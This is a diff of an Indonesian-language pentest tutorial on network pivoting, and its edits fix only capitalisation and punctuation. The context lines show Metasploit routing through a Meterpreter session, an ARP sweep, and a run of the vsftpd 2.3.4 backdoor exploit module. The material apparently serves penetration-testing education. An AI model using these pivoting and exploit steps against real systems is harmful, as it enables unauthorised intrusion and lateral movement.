@@ -68,7 +68,7 @@ Ada dua jenis pivoting:
    [*] Use the -p option to list all active routes
    ```
 
-   Atau Secara Manual:
+   Atau secara manual:
  
    ```
    background
@@ -78,7 +78,7 @@ Ada dua jenis pivoting:
    Keterangan:
    - `192.168.1.0`: Alamat IP Network target
    - `192.168.1.255`: Alamat IP Broadcast target
-   - Angka `4`: Sesi ID Meterpreter.
+   - Angka `4`: Sesi ID Meterpreter
 
    Hasil output-nya seperti ini:
 
@@ -99,7 +99,7 @@ Ada dua jenis pivoting:
    msf6 auxiliary(scanner/discovery/arp_sweep) > 
    ```
 
-   Cek Route yang Sudah Ada:
+   Cek route yang sudah ada:
 
    ```
    route print
@@ -287,7 +287,7 @@ Ada dua jenis pivoting:
 
    Dari hasil tersebut ditemukan exploit `VSFTPD v2.3.4 Backdoor Command Execution` dengan nama modul `exploit/unix/ftp/vsftpd_234_backdoor`.
 
-   Gunakan Modul Tersebut:
+   Gunakan modul tersebut:
 
    ```
    use exploit/unix/ftp/vsftpd_234_backdoor
@@ -301,7 +301,7 @@ Ada dua jenis pivoting:
 
    > Angka `0` itu ID dari modul Metasploit.
 
-   Lihat Opsi Konfigurasi:
+   Lihat opsi konfigurasi:
 
    ```
    show options
@@ -334,7 +334,7 @@ Ada dua jenis pivoting:
    View the full module info with the info, or info -d command.
    ```
 
-   Setting Target:
+   Setting target:
 
    ```
    set PAYLOAD cmd/unix/interact
@@ -343,7 +343,7 @@ Ada dua jenis pivoting:
    set verbose true
    ```
 
-   Jalankan Exploit:
+   Jalankan exploit:
 
    ```
    exploit
